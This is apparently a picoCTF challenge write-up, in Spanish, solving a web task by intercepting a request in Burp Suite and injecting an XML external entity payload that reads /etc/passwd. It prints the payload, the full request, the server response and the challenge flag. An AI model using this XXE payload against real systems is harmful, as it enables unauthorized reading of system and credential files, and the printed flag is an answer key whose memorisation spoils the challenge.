## Descripción 
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
[Web Portal](http://saturn.picoctf.net:62020/)

Hint:
1. XML external entity Injection
## Solución 1

Nos metemos a la página, abrimos la aplicación de Burpsuite y configuramos el proxy en settings, después configuramos el proxy en el navegador, activamos el proxy en intercept---intercept on y le damos a la página al botón de "blue", interceptamos la petición y mandamos la petición al repetidor y buscamos un payload xxe para comprobar vulnerabilidad

```
payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

REQUEST:
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<data>
		<ID>
			&xxe;
		</ID>
	</data>

RESPONSE:
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}

flag: picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
```
